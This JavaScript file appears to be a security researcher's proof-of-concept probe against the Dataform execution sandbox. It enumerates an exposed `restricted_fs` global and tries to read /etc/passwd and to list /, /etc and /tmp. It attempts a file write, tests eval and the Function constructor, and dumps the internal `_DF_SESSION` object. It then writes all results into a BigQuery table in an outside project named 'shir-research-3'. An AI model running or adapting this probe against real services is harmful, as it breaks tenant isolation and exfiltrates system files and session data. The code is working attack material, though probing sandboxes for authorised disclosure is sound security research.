/**
 * Restricted FS Probe
 *
 * The cross-tenant probe discovered a `restricted_fs` global.
 * This probe explores what capabilities it provides.
 */

const probeId = `restricted_fs_probe_${Date.now()}`;
const results = {
  probeId: probeId,
  timestamp: new Date().toISOString(),
  restricted_fs: {},
  vm_global: {},
  other_globals: {}
};

// ============================================
// TEST 1: Explore restricted_fs
// ============================================
try {
  if (typeof restricted_fs !== "undefined") {
    results.restricted_fs = {
      available: true,
      type: typeof restricted_fs,
      keys: Object.keys(restricted_fs),
      prototype: Object.getPrototypeOf(restricted_fs)?.constructor?.name || "unknown"
    };

    // Try to enumerate all properties
    const allProps = [];
    for (const key in restricted_fs) {
      allProps.push(key);
    }
    results.restricted_fs.allProperties = allProps;

    // Try each method
    const methods = Object.keys(restricted_fs).filter(k => typeof restricted_fs[k] === "function");
    results.restricted_fs.methods = methods;

    // Test each method with safe arguments
    const methodTests = {};
    for (const method of methods) {
      try {
        // Just check if it's callable
        methodTests[method] = {
          type: typeof restricted_fs[method],
          length: restricted_fs[method].length, // number of arguments
          name: restricted_fs[method].name
        };
      } catch (e) {
        methodTests[method] = { error: e.message };
      }
    }
    results.restricted_fs.methodTests = methodTests;

    // Try readFileSync with various paths
    if (typeof restricted_fs.readFileSync === "function") {
      const testPaths = [
        "package.json",
        "./package.json",
        "../package.json",
        "/etc/passwd",
        "/tmp/test",
        "definitions/simple_test.sqlx"
      ];
      const readTests = {};
      for (const path of testPaths) {
        try {
          const content = restricted_fs.readFileSync(path, "utf8");
          readTests[path] = {
            success: true,
            length: content.length,
            preview: String(content).substring(0, 200)
          };
        } catch (e) {
          readTests[path] = { success: false, error: e.message };
        }
      }
      results.restricted_fs.readTests = readTests;
    }

    // Try readdirSync
    if (typeof restricted_fs.readdirSync === "function") {
      const dirTests = {};
      const testDirs = [".", "..", "/", "/tmp", "/etc", "definitions"];
      for (const dir of testDirs) {
        try {
          const contents = restricted_fs.readdirSync(dir);
          dirTests[dir] = { success: true, contents: contents.slice(0, 20) };
        } catch (e) {
          dirTests[dir] = { success: false, error: e.message };
        }
      }
      results.restricted_fs.dirTests = dirTests;
    }

    // Try statSync
    if (typeof restricted_fs.statSync === "function") {
      try {
        const stat = restricted_fs.statSync(".");
        results.restricted_fs.cwdStat = {
          isDirectory: stat.isDirectory?.(),
          isFile: stat.isFile?.(),
          mode: stat.mode,
          size: stat.size
        };
      } catch (e) {
        results.restricted_fs.cwdStatError = e.message;
      }
    }

    // Try writeFileSync
    if (typeof restricted_fs.writeFileSync === "function") {
      try {
        restricted_fs.writeFileSync("/tmp/test_write", "test");
        results.restricted_fs.writeTest = { attempted: true, path: "/tmp/test_write" };
      } catch (e) {
        results.restricted_fs.writeTest = { attempted: true, error: e.message };
      }
    }

  } else {
    results.restricted_fs = { available: false };
  }
} catch (e) {
  results.restricted_fs.error = e.message;
}

// ============================================
// TEST 2: Explore vm global
// ============================================
try {
  if (typeof vm !== "undefined") {
    results.vm_global = {
      available: true,
      type: typeof vm,
      keys: Object.keys(vm)
    };

    // Check for runInNewContext, runInThisContext, etc.
    const vmMethods = ["runInNewContext", "runInThisContext", "createContext", "Script"];
    for (const method of vmMethods) {
      results.vm_global[method] = typeof vm[method];
    }
  } else {
    results.vm_global = { available: false };
  }
} catch (e) {
  results.vm_global.error = e.message;
}

// ============================================
// TEST 3: Explore other interesting globals
// ============================================
try {
  const interestingGlobals = [
    "_DF_SESSION", "core", "resolve", "path",
    "$jscomp", "InternalError", "_internalError"
  ];

  for (const name of interestingGlobals) {
    try {
      const value = eval(name);
      results.other_globals[name] = {
        available: true,
        type: typeof value,
        keys: typeof value === "object" && value !== null ? Object.keys(value).slice(0, 30) : []
      };
    } catch (e) {
      results.other_globals[name] = { available: false, error: e.message };
    }
  }

  // Check _DF_SESSION specifically
  if (typeof _DF_SESSION !== "undefined") {
    results.other_globals._DF_SESSION_detail = {
      value: JSON.stringify(_DF_SESSION).substring(0, 500)
    };
  }
} catch (e) {
  results.other_globals.error = e.message;
}

// ============================================
// TEST 4: Eval and Function capabilities
// ============================================
try {
  results.dynamicExec = {};

  // Test eval
  try {
    const evalResult = eval("1 + 1");
    results.dynamicExec.eval = { works: true, result: evalResult };
  } catch (e) {
    results.dynamicExec.eval = { works: false, error: e.message };
  }

  // Test Function constructor
  try {
    const fn = new Function("return 2 + 2");
    results.dynamicExec.functionConstructor = { works: true, result: fn() };
  } catch (e) {
    results.dynamicExec.functionConstructor = { works: false, error: e.message };
  }

  // Test if we can access globals via eval
  try {
    const globalsViaEval = eval("Object.keys(globalThis)");
    results.dynamicExec.globalsViaEval = globalsViaEval.slice(0, 30);
  } catch (e) {
    results.dynamicExec.globalsViaEvalError = e.message;
  }

} catch (e) {
  results.dynamicExec.error = e.message;
}

// ============================================
// Store Results
// ============================================

dataform.projectConfig.defaultDatabase = "shir-research-3";
dataform.projectConfig.defaultSchema = "dataform_poc";

operate("restricted_fs_results").queries([
  `-- Restricted FS Probe Results - ${probeId}
   CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.restricted_fs_probe\` AS
   SELECT
     '${probeId}' as probe_id,
     CURRENT_TIMESTAMP() as probe_time,
     '''${JSON.stringify(results, null, 2).replace(/'/g, "\\'")}''' as results_json`
]);
